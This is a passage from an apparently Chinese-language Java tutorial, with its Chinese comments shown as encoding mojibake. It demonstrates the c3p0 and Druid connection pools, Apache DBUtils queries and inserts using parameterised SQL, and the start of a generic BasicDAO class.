{\n        //1. åˆ›å»ºä¸€ä¸ªæ•°æ®æºå¯¹è±¡\n        ComboPooledDataSource comboPooledDataSource = new ComboPooledDataSource();\n        //2. é€šè¿‡é…ç½®æ–‡ä»¶mysql.properties è·å–ç›¸å…³è¿æ¥çš„ä¿¡æ¯\n        Properties properties = new Properties();\n        properties.load(new FileInputStream(\"src//mysql.properties\"));\n        //è¯»å–ç›¸å…³çš„å±æ€§å€¼\n        String user = properties.getProperty(\"user\");\n        String password = properties.getProperty(\"password\");\n        String url = properties.getProperty(\"url\");\n        String driver = properties.getProperty(\"driver\");\n        //ç»™æ•°æ®æºcomboPooledDataSource è®¾ç½®ç›¸å…³çš„å‚æ•°\n        //æ³¨æ„ï¼šè¿æ¥ç®¡ç†æ˜¯ç”±comboPooledDataSource æ¥ç®¡ç†\n        comboPooledDataSource.setDriverClass(driver);\n        comboPooledDataSource.setJdbcUrl(url);\n        comboPooledDataSource.setUser(user);\n        comboPooledDataSource.setPassword(password);\n        //è®¾ç½®åˆå§‹åŒ–è¿æ¥æ•°\n        comboPooledDataSource.setInitialPoolSize(10);\n        //æœ€å¤§è¿æ¥æ•°\n        comboPooledDataSource.setMaxPoolSize(50);\n        //æµ‹è¯•è¿æ¥æ± çš„æ•ˆç‡, æµ‹è¯•å¯¹mysql 5000 æ¬¡æ“ä½œ\n        long start = System.currentTimeMillis();\n        for (int i = 0; i < 50000; i++) {\n            Connection connection = comboPooledDataSource.getConnection();//è¿™ä¸ªæ–¹æ³•å°±æ˜¯ä»DataSource æ¥å£å®ç°çš„\n            //System.out.println(\"è¿æ¥OK\");\n            connection.close();\n        }\n        long end = System.currentTimeMillis();\n        System.out.println(\"c3p0çš„ç¬¬ä¸€ç§æ–¹å¼è¿æ¥mysql 50000æ¬¡è€—æ—¶=\" + (end - start));\n        //c3p0çš„ç¬¬ä¸€ç§æ–¹å¼è¿æ¥mysql 5000æ¬¡è€—æ—¶=516\n    }\n}\n```\n\n##### æ–¹å¼äºŒ\n\nä½¿ç”¨é…ç½®æ–‡ä»¶æ¨¡æ¿æ¥å®Œæˆ\n\n```java\npackage com.jwt.jdbc.datasource;\n\nimport com.mchange.v2.c3p0.ComboPooledDataSource;\nimport org.junit.Test;\n\nimport java.beans.PropertyVetoException;\nimport java.io.FileInputStream;\nimport java.io.IOException;\nimport java.sql.Connection;\nimport java.sql.SQLException;\nimport java.util.Properties;\n\npublic class C3P0_ {\n  \n  //æ–¹å¼2ï¼šä½¿ç”¨é…ç½®æ–‡ä»¶æ¨¡æ¿æ¥å®Œæˆ\n  @Test\n  public void testC3P0_02() throws SQLException {\n      ComboPooledDataSource comboPooledDataSource = new ComboPooledDataSource(\"jwt_c3p0\");\n      //æµ‹è¯•è¿æ¥æ± çš„æ•ˆç‡, æµ‹è¯•å¯¹mysql 5000 æ¬¡æ“ä½œ\n      long start = System.currentTimeMillis();\n      for (int i = 0; i < 50000; i++) {\n        Connection connection = comboPooledDataSource.getConnection();//è¿™ä¸ªæ–¹æ³•å°±æ˜¯ä»DataSource æ¥å£å®ç°çš„\n        //System.out.println(\"è¿æ¥OK~\");\n        connection.close();\n      }\n      long end = System.currentTimeMillis();\n      System.out.println(\"c3p0çš„ç¬¬äºŒç§æ–¹å¼è¿æ¥mysql 50000æ¬¡è€—æ—¶=\" + (end - start));\n      //c3p0çš„ç¬¬äºŒç§æ–¹å¼è¿æ¥mysql 5000æ¬¡è€—æ—¶=512\n  }\n}\n```\n\n#### Druid(å¾·é²ä¼Š)\n\n##### **å‡†å¤‡å·¥ä½œ**\n\n- 1.åŠ å…¥Druid jar åŒ…\n- 2.åŠ å…¥é…ç½®æ–‡ä»¶ druid.properties , å°†è¯¥æ–‡ä»¶æ‹·è´é¡¹ç›®çš„ src ç›®å½•\n\n```properties\n#key=value\ndriverClassName=com.mysql.jdbc.Driver\nurl=jdbc:mysql://localhost:3306/jwt?rewriteBatchedStatements=true\n#url=jdbc:mysql://localhost:3306/jwt\nusername=root\npassword=root\n#initial connection Size\ninitialSize=10\n#min idle connecton size\nminIdle=5\n#max active connection size\nmaxActive=20\n#max wait time (5000 mil seconds)\nmaxWait=5000\n```\n\n##### ä»£ç å®ç°\n\n```java\npackage com.jwt.jdbc.datasource;\n\nimport com.alibaba.druid.pool.DruidDataSourceFactory;\nimport org.junit.Test;\n\nimport javax.sql.DataSource;\nimport java.io.FileInputStream;\nimport java.sql.Connection;\nimport java.util.Properties;\n\npublic class Druid_ {\n    @Test\n    public  void testDruid() throws Exception {\n        //1. åˆ›å»ºProperties å¯¹è±¡, è¯»å–é…ç½®æ–‡ä»¶\n        Properties properties = new Properties();\n        properties.load(new FileInputStream(\"src//druid.properties\"));\n        //2. åˆ›å»ºä¸€ä¸ªæŒ‡å®šå‚æ•°çš„æ•°æ®åº“è¿æ¥æ± , Druid è¿æ¥æ± \n        DataSource dataSource = DruidDataSourceFactory.createDataSource(properties);\n        long start = System.currentTimeMillis();\n        for (int i = 0; i < 50000; i++) {\n            Connection connection = dataSource.getConnection();\n            //System.out.println(connection.getClass());\n            //System.out.println(\"è¿æ¥æˆåŠŸ!\");\n            connection.close();\n        }\n        long end = System.currentTimeMillis();\n        System.out.println(\"Druid è¿æ¥æ± æ“ä½œ50000æ¬¡ mysql è€—æ—¶=\" + (end - start));\n        //Druid è¿æ¥æ± æ“ä½œ50000æ¬¡ mysql è€—æ—¶=329\n    }\n}\n```\n\n##### å°†JDBCUtilsæ”¹æˆDruidå®ç°\n\n```java\npackage com.jwt.jdbc.datasource;\n\nimport com.alibaba.druid.pool.DruidDataSourceFactory;\n\nimport javax.sql.DataSource;\nimport java.io.FileInputStream;\nimport java.sql.Connection;\nimport java.sql.ResultSet;\nimport java.sql.SQLException;\nimport java.sql.Statement;\nimport java.util.Properties;\n\npublic class JDBCUtilsByDruid {\n    private static DataSource ds;\n    //åœ¨é™æ€ä»£ç å—å®Œæˆds åˆå§‹åŒ–\n    static {\n        Properties properties = new Properties();\n        try {\n            properties.load(new FileInputStream(\"src//druid.properties\"));\n            ds = DruidDataSourceFactory.createDataSource(properties);\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n    //ç¼–å†™getConnection æ–¹æ³•\n    public static Connection getConnection() throws SQLException {\n        return ds.getConnection();\n    }\n    //å…³é—­è¿æ¥, å¼ºè°ƒï¼šåœ¨æ•°æ®åº“è¿æ¥æ± æŠ€æœ¯ä¸­ï¼Œclose ä¸æ˜¯çœŸçš„æ–­æ‰è¿æ¥\n    //è€Œæ˜¯æŠŠä½¿ç”¨çš„Connection å¯¹è±¡æ”¾å›è¿æ¥æ± \n    public static void close(ResultSet resultSet, Statement statement, Connection connection) {\n        try {\n            if (resultSet != null) {\n                resultSet.close();\n            }\n            if (statement != null) {\n                statement.close();\n            }\n            if (connection != null) {\n                connection.close();\n            }\n        } catch (SQLException e) {\n            throw new RuntimeException(e);\n        }\n    }\n}\n```\n\n##### ä½¿ç”¨JDBCUtilsByDruidè¿›è¡ŒQuery\n\n```java\npackage com.jwt.jdbc.datasource;\n\nimport org.junit.Test;\n\nimport java.sql.*;\n\npublic class JDBCUtilsByDruid_Use {\n\n    @Test\n    public void testSelect() {\n        System.out.println(\"ä½¿ç”¨ druid æ–¹å¼å®Œæˆ\");\n        //1. å¾—åˆ°è¿æ¥\n        Connection connection = null;\n        //2. ç»„ç»‡ä¸€ä¸ªsql\n        String sql = \"select * from user where id = ?\";\n        PreparedStatement preparedStatement = null;\n        ResultSet set = null;\n        //3. åˆ›å»ºPreparedStatement å¯¹è±¡\n        try {\n            connection = JDBCUtilsByDruid.getConnection();\n            System.out.println(connection.getClass());//è¿è¡Œç±»å‹com.alibaba.druid.pool.DruidPooledConnection\n            preparedStatement = connection.prepareStatement(sql);\n            preparedStatement.setInt(1, 1);//ç»™?å·èµ‹å€¼\n            //æ‰§è¡Œ, å¾—åˆ°ç»“æœé›†\n            set = preparedStatement.executeQuery();\n            //éå†è¯¥ç»“æœé›†\n            while (set.next()) {\n                int id = set.getInt(\"id\");\n                String name = set.getString(\"name\");\n                String password = set.getString(\"password\");\n                Date birthday = set.getDate(\"birthday\");\n                System.out.println(id + \"\\t\" + name + \"\\t\"  + password + \"\\t\" + birthday);\n            }\n        } catch (SQLException e) {\n            e.printStackTrace();\n        } finally {\n            //å…³é—­èµ„æº\n            JDBCUtilsByDruid.close(set, preparedStatement, connection);\n        }\n    }\n}\n```\n\n###  11.Apache-DBUtils\n\n#### é—®é¢˜å¼•å‡º\n\n- 1.å…³é—­connectionå, resultSetç»“æœé›†æ— æ³•ä½¿ç”¨\n- 2.resultSetä¸åˆ©äºæ•°æ®çš„ç®¡ç†\n\n#### åœŸæ–¹æ³•æ¥è§£å†³\n\n```java\npackage com.jwt.jdbc.datasource;\n\nimport org.junit.Test;\n\nimport java.sql.*;\nimport java.util.ArrayList;\n\npublic class JDBCUtilsByDruid_Use {\n\n    //ä½¿ç”¨è€å¸ˆçš„åœŸæ–¹æ³•æ¥è§£å†³ResultSet =å°è£…=> Arraylist\n    @Test\n    public void testSelectToArrayList() {\n        System.out.println(\"ä½¿ç”¨druid æ–¹å¼å®Œæˆ\");\n        //1. å¾—åˆ°è¿æ¥\n        Connection connection = null;\n        //2. ç»„ç»‡ä¸€ä¸ªsql\n        String sql = \"select * from user where id >= ?\";\n        PreparedStatement preparedStatement = null;\n        ResultSet set = null;\n        ArrayList<User> list = new ArrayList<>();//åˆ›å»ºArrayList å¯¹è±¡,å­˜æ”¾userå¯¹è±¡\n        //3. åˆ›å»ºPreparedStatement å¯¹è±¡\n        try {\n            connection = JDBCUtilsByDruid.getConnection();\n            System.out.println(connection.getClass());//è¿è¡Œç±»å‹com.alibaba.druid.pool.DruidPooledConnection\n            preparedStatement = connection.prepareStatement(sql);\n            preparedStatement.setInt(1, 1);//ç»™?å·èµ‹å€¼\n            //æ‰§è¡Œ, å¾—åˆ°ç»“æœé›†\n            set = preparedStatement.executeQuery();\n            //éå†è¯¥ç»“æœé›†\n            while (set.next()) {\n                int id = set.getInt(\"id\");\n                String name = set.getString(\"name\");//getName()\n                String password = set.getString(\"password\");//getSex()\n                Date birthday = set.getDate(\"birthday\");\n                //æŠŠå¾—åˆ°çš„resultset çš„è®°å½•ï¼Œå°è£…åˆ°User å¯¹è±¡ï¼Œæ”¾å…¥åˆ°list é›†åˆ\n                list.add(new User(id, name, password, birthday));\n            }\n            System.out.println(\"listé›†åˆæ•°æ®=\" + list);\n        } catch (SQLException e) {\n            e.printStackTrace();\n        } finally {\n            //å…³é—­èµ„æº\n            JDBCUtilsByDruid.close(set, preparedStatement, connection);\n        }\n        //å› ä¸ºArrayList å’Œconnection æ²¡æœ‰ä»»ä½•å…³è”ï¼Œæ‰€ä»¥è¯¥é›†åˆå¯ä»¥å¤ç”¨.\n        for (User user : list) {\n            System.out.println(\"id=\" + user.getId() + \"\\t\" + \"name=\" + user.getName());\n        }\n    }\n}\n```\n\nUser.java\n\n```java\npackage com.jwt.jdbc.datasource;\n\nimport java.util.Date;\n\npublic class User { //JavaBeanï¼ŒPOJOï¼ŒDomain\n    private Integer id;//ä½¿ç”¨åŒ…è£…ç±»åŸå› åé¢è¯´\n    private String name;\n    private String password;\n    private Date birthday;\n\n    public User() {\n    }\n\n    public User(Integer id, String name, String password, Date birthday) {\n        this.id = id;\n        this.name = name;\n        this.password = password;\n        this.birthday = birthday;\n    }\n\n    public Integer getId() {\n        return id;\n    }\n\n    public void setId(Integer id) {\n        this.id = id;\n    }\n\n    public String getName() {\n        return name;\n    }\n\n    public void setName(String name) {\n        this.name = name;\n    }\n\n    public String getPassword() {\n        return password;\n    }\n\n    public void setPassword(String password) {\n        this.password = password;\n    }\n\n    public Date getBirthday() {\n        return birthday;\n    }\n\n    public void setBirthday(Date birthday) {\n        this.birthday = birthday;\n    }\n\n    @Override\n    public String toString() {\n        return \"\\nUser{\" +\n                \"id=\" + id +\n                \", name='\" + name + '\\'' +\n                \", password='\" + password + '\\'' +\n                \", birthday=\" + birthday +\n                '}';\n    }\n}\n```\n\n#### Apache-DBUtilsè§£å†³\n\n##### ä»‹ç»\n\ncommons- dbutils æ˜¯ Apache ç»„ç»‡æä¾›çš„ä¸€ä¸ªå¼€æºJDBCå·¥å…·ç±»åº“ï¼Œå®ƒæ˜¯å¯¹JDBCçš„å°è£…ï¼Œä½¿ç”¨dbutilsèƒ½æå¤§ç®€åŒ–jdbcç¼–ç çš„å·¥ä½œé‡ã€‚\n\nDbUtilsç±»\n\n1. QueryRunnerç±»:è¯¥ç±»å°è£…äº†SQLçš„æ‰§è¡Œï¼Œæ˜¯çº¿ç¨‹å®‰å…¨çš„ã€‚å¯ä»¥å®ç°å¢ã€åˆ ã€æ”¹ã€æŸ¥ã€æ‰¹å¤„ç†\n2. ä½¿ç”¨QueryRunnerç±»å®ç°æŸ¥è¯¢\n3. ResultSetHandleræ¥å£:è¯¥æ¥å£ç”¨äºå¤„ç†java.sql.ResultSet,å°†æ•°æ®æŒ‰è¦æ±‚è½¬æ¢ä¸ºå¦ç§å½¢å¼ï¼Œ\n\nArrayHandler: æŠŠç»“æœé›†ä¸­çš„ç¬¬ä¸€è¡Œæ•°æ®è½¬æˆå¯¹è±¡æ•°ç»„ã€‚\nArrayListHandler:æŠŠç»“æœé›†ä¸­çš„æ¯ä¸€è¡Œæ•°æ®éƒ½è½¬æˆä¸€ä¸ªæ•°ç»„ï¼Œ å†å­˜æ”¾åˆ°Listä¸­ã€‚\nBeanHandler:å°†ç»“æœé›†ä¸­çš„ç¬¬ä¸€è¡Œæ•°æ®å°è£…åˆ°ä¸€ä¸ªå¯¹åº”çš„JavaBeanå®ä¾‹ä¸­ã€‚\nBeanListHandler:å°†ç»“æœé›†ä¸­çš„æ¯ä¸€è¡Œæ•°æ®éƒ½å°è£…åˆ°ä¸€ä¸ªå¯¹åº”çš„JavaBeanå®ä¾‹ä¸­ï¼Œå­˜æ”¾åˆ°Listé‡Œã€‚\nColumnListHandler:å°†ç»“æœé›†ä¸­æŸä¸€åˆ—çš„æ•°æ®å­˜æ”¾åˆ°Listä¸­ã€‚\nKeyedHandler(name): å°†ç»“æœé›†ä¸­çš„æ¯è¡Œæ•°æ®éƒ½å°è£…åˆ°Mapé‡Œï¼Œ å†æŠŠè¿™äº›mapå†å­˜åˆ°ä¸€ä¸ªmapé‡Œï¼Œå…¶keyä¸ºæŒ‡å®šçš„keyã€‚\nMapHandler:å°†ç»“æœé›†ä¸­çš„ç¬¬ä¸€è¡Œæ•°æ®å°è£…åˆ°ä¸€ä¸ªMapé‡Œï¼Œkeyæ˜¯åˆ—åï¼Œvalueå°±æ˜¯å¯¹åº”çš„å€¼ã€‚\nMapListHandler:å°†ç»“æœé›†ä¸­çš„æ¯ä¸€è¡Œæ•°æ®éƒ½å°è£…åˆ°ä¸€ä¸ªMapé‡Œï¼Œç„¶åå†å­˜æ”¾åˆ°List\n\n##### DBUtils +Druidå¯¹è¡¨crud\n\n**å‡†å¤‡å·¥ä½œï¼š**ä½¿ç”¨DBUtils ç±»å’Œæ¥å£, å…ˆå¼•å…¥DBUtils ç›¸å…³çš„ jar , åŠ å…¥åˆ°æœ¬Project\n\n1ã€ä½¿ç”¨apache-DBUtils å·¥å…·ç±»+ druid å®Œæˆè¿”å›çš„ç»“æœæ˜¯**å¤šè¡Œè®°å½•**\n\n```java\npackage com.jwt.jdbc.datasource;\n\nimport org.apache.commons.dbutils.QueryRunner;\nimport org.apache.commons.dbutils.handlers.BeanHandler;\nimport org.apache.commons.dbutils.handlers.BeanListHandler;\nimport org.apache.commons.dbutils.handlers.ScalarHandler;\nimport org.junit.Test;\n\nimport java.sql.Connection;\nimport java.sql.SQLException;\nimport java.util.List;\n\npublic class DBUtils_Use {\n\n    //ä½¿ç”¨apache-DBUtils å·¥å…·ç±»+ druid å®Œæˆå¯¹è¡¨çš„crud æ“ä½œ\n    @Test\n    public void testQueryMany() throws SQLException {\n        //1. å¾—åˆ°è¿æ¥(druid)\n        Connection connection = JDBCUtilsByDruid.getConnection();\n        //2. åˆ›å»ºQueryRunner\n        QueryRunner queryRunner = new QueryRunner();\n        //3. å°±å¯ä»¥æ‰§è¡Œç›¸å…³çš„æ–¹æ³•ï¼Œè¿”å›ArrayList ç»“æœé›†\n        String sql = \"select * from user where id >= ?\";\n        // æ³¨æ„: sql è¯­å¥ä¹Ÿå¯ä»¥æŸ¥è¯¢éƒ¨åˆ†åˆ—\n        //String sql = \"select id, name from user where id >= ?\";\n        // è€éŸ©è§£è¯»\n        //(1) query æ–¹æ³•å°±æ˜¯æ‰§è¡Œsql è¯­å¥ï¼Œå¾—åˆ°resultset ---å°è£…åˆ°--> ArrayList é›†åˆä¸­,å†è¿”å›é›†åˆ\n        //(2) connection: è¿æ¥\n        //(3) sql : æ‰§è¡Œçš„sql è¯­å¥\n        //(4) new BeanListHandler<>(User.class): åœ¨å°†resultset -> User å¯¹è±¡-> å°è£…åˆ°ArrayList\n        // åº•å±‚ä½¿ç”¨åå°„æœºåˆ¶å»è·å–User ç±»çš„å±æ€§ï¼Œç„¶åè¿›è¡Œå°è£…\n        //(5) 1 å°±æ˜¯ç»™sql è¯­å¥ä¸­çš„? èµ‹å€¼ï¼Œå¯ä»¥æœ‰å¤šä¸ªå€¼ï¼Œå› ä¸ºæ˜¯å¯å˜å‚æ•°Object... params\n        //(6) åº•å±‚å¾—åˆ°çš„resultset ,ä¼šåœ¨query å…³é—­, å…³é—­PreparedStatment\n        List<User> list = queryRunner.query(connection, sql, new BeanListHandler<>(User.class), 1);\n        System.out.println(\"listé›†åˆæ•°æ®=\" + list);\n        System.out.println(\"è¾“å‡ºé›†åˆçš„ä¿¡æ¯\");\n        for (User user : list) {\n            System.out.print(user);\n        }\n        //é‡Šæ”¾èµ„æº\n        JDBCUtilsByDruid.close(null, null, connection);\n    }\n}\n```\n\n2ã€ä½¿ç”¨apache-DBUtils å·¥å…·ç±»+ druid å®Œæˆè¿”å›çš„ç»“æœæ˜¯**å•è¡Œè®°å½•(å•ä¸ªå¯¹è±¡)**\n\n```java\npackage com.jwt.jdbc.datasource;\n\nimport org.apache.commons.dbutils.QueryRunner;\nimport org.apache.commons.dbutils.handlers.BeanHandler;\nimport org.apache.commons.dbutils.handlers.BeanListHandler;\nimport org.apache.commons.dbutils.handlers.ScalarHandler;\nimport org.junit.Test;\n\nimport java.sql.Connection;\nimport java.sql.SQLException;\nimport java.util.List;\n\npublic class DBUtils_Use {\n\n    \n    //æ¼”ç¤ºapache-dbutils + druid å®Œæˆè¿”å›çš„ç»“æœæ˜¯å•è¡Œè®°å½•(å•ä¸ªå¯¹è±¡)\n    @Test\n    public void testQuerySingle() throws SQLException {\n        //1. å¾—åˆ°è¿æ¥(druid)\n        Connection connection = JDBCUtilsByDruid.getConnection();\n        //2. åˆ›å»ºQueryRunner\n        QueryRunner queryRunner = new QueryRunner();\n        //3. å°±å¯ä»¥æ‰§è¡Œç›¸å…³çš„æ–¹æ³•ï¼Œè¿”å›å•ä¸ªå¯¹è±¡\n        String sql = \"select * from user where id = ?\";\n        // å› ä¸ºæˆ‘ä»¬è¿”å›çš„å•è¡Œè®°å½•<--->å•ä¸ªå¯¹è±¡, ä½¿ç”¨çš„Hander æ˜¯BeanHandler\n        User user = queryRunner.query(connection, sql, new BeanHandler<>(User.class), 2);\n        System.out.println(user);\n        // é‡Šæ”¾èµ„æº\n        JDBCUtilsByDruid.close(null, null, connection);\n    }\n}\n```\n\n3ã€ä½¿ç”¨apache-DBUtils å·¥å…·ç±»+ druid å®Œæˆè¿”å›çš„ç»“æœæ˜¯**å•è¡Œå•åˆ—(object)**\n\n```java\npackage com.jwt.jdbc.datasource;\n\nimport org.apache.commons.dbutils.QueryRunner;\nimport org.apache.commons.dbutils.handlers.BeanHandler;\nimport org.apache.commons.dbutils.handlers.BeanListHandler;\nimport org.apache.commons.dbutils.handlers.ScalarHandler;\nimport org.junit.Test;\n\nimport java.sql.Connection;\nimport java.sql.SQLException;\nimport java.util.List;\n\npublic class DBUtils_Use {\n\n    //æ¼”ç¤ºapache-dbutils + druid å®ŒæˆæŸ¥è¯¢ç»“æœæ˜¯å•è¡Œå•åˆ—(object)\n    @Test\n    public void testScalar() throws SQLException {\n        //1. å¾—åˆ°è¿æ¥(druid)\n        Connection connection = JDBCUtilsByDruid.getConnection();\n        //2. åˆ›å»ºQueryRunner\n        QueryRunner queryRunner = new QueryRunner();\n        //3. å°±å¯ä»¥æ‰§è¡Œç›¸å…³çš„æ–¹æ³•ï¼Œè¿”å›å•è¡Œå•åˆ—, è¿”å›çš„å°±æ˜¯Object\n        String sql = \"select name from user where id = ?\";\n        //å› ä¸ºè¿”å›çš„æ˜¯ä¸€ä¸ªå¯¹è±¡, ä½¿ç”¨çš„handler å°±æ˜¯ScalarHandler\n        Object obj = queryRunner.query(connection, sql, new ScalarHandler(), 3);\n        System.out.println(obj);\n        // é‡Šæ”¾èµ„æº\n        JDBCUtilsByDruid.close(null, null, connection);\n        }\n}\n```\n\n4ã€ä½¿ç”¨apache-DBUtils å·¥å…·ç±»+ druid å®Œæˆdml (update, insert ,delete)\n\n```java\npackage com.jwt.jdbc.datasource;\n\nimport org.apache.commons.dbutils.QueryRunner;\nimport org.apache.commons.dbutils.handlers.BeanHandler;\nimport org.apache.commons.dbutils.handlers.BeanListHandler;\nimport org.apache.commons.dbutils.handlers.ScalarHandler;\nimport org.junit.Test;\n\nimport java.sql.Connection;\nimport java.sql.SQLException;\nimport java.util.List;\n\npublic class DBUtils_Use {\n    //æ¼”ç¤ºapache-dbutils + druid å®Œæˆdml (update, insert ,delete)\n    @Test\n    public void testDML() throws SQLException {\n        //1. å¾—åˆ°è¿æ¥(druid)\n        Connection connection = JDBCUtilsByDruid.getConnection();\n        //2. ä½¿ç”¨DBUtils ç±»å’Œæ¥å£, å…ˆå¼•å…¥DBUtils ç›¸å…³çš„jar , åŠ å…¥åˆ°æœ¬Project\n        //3. åˆ›å»ºQueryRunner\n        QueryRunner queryRunner = new QueryRunner();\n        //4. è¿™é‡Œç»„ç»‡sql å®Œæˆupdate, insert delete\n        //String sql = \"update user set name = ? where id = ?\";\n        String sql = \"insert into user values(null, ?, ?, ?)\";//idä¸ºè‡ªå¢é•¿\n        //String sql = \"delete from user where id = ?\";\n        //(1) æ‰§è¡Œdml æ“ä½œæ˜¯queryRunner.update()\n        //(2) è¿”å›çš„å€¼æ˜¯å—å½±å“çš„è¡Œæ•°(affected: å—å½±å“)\n        //int affectedRow = queryRunner.update(connection,sql,Tom2,2);\n        int affectedRow = queryRunner.update(connection, sql, \"jianjian\", \"789\", \"2000-10-10\");\n        //int affectedRow = queryRunner.update(connection, sql, 3);\n        System.out.println(affectedRow > 0 ? \"æ‰§è¡ŒæˆåŠŸ\" : \"æ‰§è¡Œæ²¡æœ‰å½±å“åˆ°è¡¨\");\n        // é‡Šæ”¾èµ„æº\n        JDBCUtilsByDruid.close(null, null, connection);\n    }\n}\n```\n\n#### æ•°æ®è¡¨å’ŒJavaBeançš„æ•°æ®ç±»å‹æ˜ å°„\n\nintã€doubleç­‰åœ¨Javaä¸­éƒ½ç”¨åŒ…è£…ç±»,å› ä¸ºmysqlä¸­çš„æ‰€æœ‰ç±»å‹éƒ½å¯èƒ½æ˜¯NULL,è€ŒJavaåªæœ‰å¼•ç”¨æ•°æ®ç±»å‹æ‰æœ‰\nNULLå€¼\n\n![](https://img.jwt1399.top/img/image-20220222142620080.png)\n\n### 12.BasicDAO\n\n#### é—®é¢˜å¼•å‡º\n\napache dbutils+ Druidç®€åŒ–äº†JDBCå¼€å‘ï¼Œä½†è¿˜æœ‰ä¸è¶³:\n\n- 1ã€SQL è¯­å¥æ˜¯å›ºå®šï¼Œä¸èƒ½é€šè¿‡å‚æ•°ä¼ å…¥ï¼Œé€šç”¨æ€§ä¸å¥½ï¼Œéœ€è¦æ”¹å¾—æ›´æ–¹ä¾¿æ‰§è¡Œå¢åˆ æ”¹æŸ¥\n- 2ã€å¯¹äº select æ“ä½œï¼Œå¦‚æœæœ‰è¿”å›å€¼è¿”å›ç±»å‹ä¸èƒ½å›ºå®šï¼Œéœ€è¦ä½¿ç”¨æ³›å‹\n- 3ã€å°†æ¥çš„è¡¨å¾ˆå¤šï¼Œä¸šåŠ¡éœ€æ±‚å¤æ‚ï¼Œä¸å¯èƒ½åªé ä¸€ä¸ªJavaç±»å®Œæˆ\n\n#### DAOä»‹ç»\n\nDAOï¼šdata access objects æ•°æ®è®¿é—®å¯¹è±¡\n\n- é€šç”¨ç±»ï¼Œç§°ä¸ºBasicDaoï¼Œæ˜¯å…¶ä»–Daoçš„çˆ¶ç±»ï¼Œæ˜¯ä¸“é—¨å’Œæ•°æ®åº“äº¤äº’çš„ï¼Œå³å®Œæˆå¯¹æ•°æ®åº“(è¡¨)çš„crud æ“ä½œã€‚\n- åœ¨BaiscDaoçš„åŸºç¡€ä¸Šï¼Œå®ç°ä¸€å¼ è¡¨å¯¹åº”ä¸€ä¸ªDaoï¼Œæ›´å¥½çš„å®ŒæˆåŠŸèƒ½ï¼Œæ¯”å¦‚Customerè¡¨-\n  Customer.java(javabean)-CustomerDao.java\n\n### 13.BasicDaoå®ä¾‹\n\n**æ–‡ä»¶åˆ—è¡¨**\n\n- com.jwt.dao_.utils //å·¥å…·ç±»\n- com.jwt.dao\\_.domain //javabean\n- com.jwt.dao\\_.dao //å­˜æ”¾XxxDAOå’ŒBasicDAO\n- com.jwt.dao\\_.test //å†™æµ‹è¯•ç±»\n\n#### com.jwt.dao_.utils\n\n##### JDBCUtilsByDruid.java\n\n```java\npackage com.jwt.dao_.utils;\n\nimport com.alibaba.druid.pool.DruidDataSourceFactory;\n\nimport javax.sql.DataSource;\nimport java.io.FileInputStream;\nimport java.sql.Connection;\nimport java.sql.ResultSet;\nimport java.sql.SQLException;\nimport java.sql.Statement;\nimport java.util.Properties;\n\npublic class JDBCUtilsByDruid {\n    private static DataSource ds;\n    //åœ¨é™æ€ä»£ç å—å®Œæˆds åˆå§‹åŒ–\n    static {\n        Properties properties = new Properties();\n        try {\n            properties.load(new FileInputStream(\"src//druid.properties\"));\n            ds = DruidDataSourceFactory.createDataSource(properties);\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n    //ç¼–å†™getConnection æ–¹æ³•\n    public static Connection getConnection() throws SQLException {\n        return ds.getConnection();\n    }\n    //å…³é—­è¿æ¥, å¼ºè°ƒï¼šåœ¨æ•°æ®åº“è¿æ¥æ± æŠ€æœ¯ä¸­ï¼Œclose ä¸æ˜¯çœŸçš„æ–­æ‰è¿æ¥\n    //è€Œæ˜¯æŠŠä½¿ç”¨çš„Connection å¯¹è±¡æ”¾å›è¿æ¥æ± \n    public static void close(ResultSet resultSet, Statement statement, Connection connection) {\n        try {\n            if (resultSet != null) {\n                resultSet.close();\n            }\n            if (statement != null) {\n                statement.close();\n            }\n            if (connection != null) {\n                connection.close();\n            }\n        } catch (SQLException e) {\n            throw new RuntimeException(e);\n        }\n    }\n}\n\n```\n\n#### com.jwt.dao\\_.domain\n\n##### User.java\n\n```java\npackage com.jwt.dao_.domain;\n\nimport java.util.Date;\n\npublic class User { //Javabeanï¼ŒPOJOï¼ŒDomain\n    private Integer id;\n    private String name;\n    private String password;\n    private Date birthday;\n\n    public User() {\n    }\n\n    public User(Integer id, String name, String password, Date birthday) {\n        this.id = id;\n        this.name = name;\n        this.password = password;\n        this.birthday = birthday;\n    }\n\n    public Integer getId() {\n        return id;\n    }\n\n    public void setId(Integer id) {\n        this.id = id;\n    }\n\n    public String getName() {\n        return name;\n    }\n\n    public void setName(String name) {\n        this.name = name;\n    }\n\n    public String getPassword() {\n        return password;\n    }\n\n    public void setPassword(String password) {\n        this.password = password;\n    }\n\n    public Date getBirthday() {\n        return birthday;\n    }\n\n    public void setBirthday(Date birthday) {\n        this.birthday = birthday;\n    }\n\n    @Override\n    public String toString() {\n        return \"\\nUser{\" +\n                \"id=\" + id +\n                \", name='\" + name + '\\'' +\n                \", password='\" + password + '\\'' +\n                \", birthday=\" + birthday +\n                '}';\n    }\n}\n```\n\n#### com.jwt.dao_.dao\n\n##### BasicDAO.java\n\n```java\npackage com.jwt.dao_.dao;\n\nimport com.jwt.dao_.utils.JDBCUtilsByDruid;\nimport org.apache.commons.dbutils.QueryRunner;\nimport org.apache.commons.dbutils.handlers.BeanHandler;\nimport org.apache.commons.dbutils.handlers.BeanListHandler;\nimport org.apache.commons.dbutils.handlers.ScalarHandler;\n\nimport java.sql.Connection;\nimport java.sql.SQLException;\nimport java.util.List;\n\npublic class BasicDAO<T> { //æ³›å‹æŒ‡å®šå…·ä½“ç±»å‹\n\n    private QueryRunner qr = new QueryRunner();\n\n    //å¼€å‘é€šç”¨çš„dmlï¼Œé’ˆå¯¹ä»»æ„è¡¨\n    public int update(String sql,Object... parameters){\n        Connection connection =null;\n        try {\n            connection = JDBCUtilsByDruid.getConnection();\n            int update = qr.update(connection,sql,parameters);\n            return update;\n        } catch (SQLException e) {\n            throw new RuntimeException(); //å°†ç¼–è¯‘å¼‚å¸¸è½¬åŒ–ä¸ºè¿è¡Œå¼‚å¸¸\n        } finally {\n            JDBCUtilsByDruid.close(null,null,connection);\n        }\n\n\n    }\n\n    /**\n     *\n     * @param sql sql è¯­å¥ï¼Œå¯ä»¥æœ‰?\n     * @param clazz ä¼ å…¥ä¸€ä¸ªç±»çš„Class å¯¹è±¡æ¯”å¦‚User.class\n     * @param parameters ä¼ å…¥? çš„å…·ä½“çš„å€¼ï¼Œå¯ä»¥æ˜¯å¤šä¸ª\n     * @return æ ¹æ®User.class è¿”å›å¯¹åº”çš„ArrayList é›†åˆ\n     */\n\n    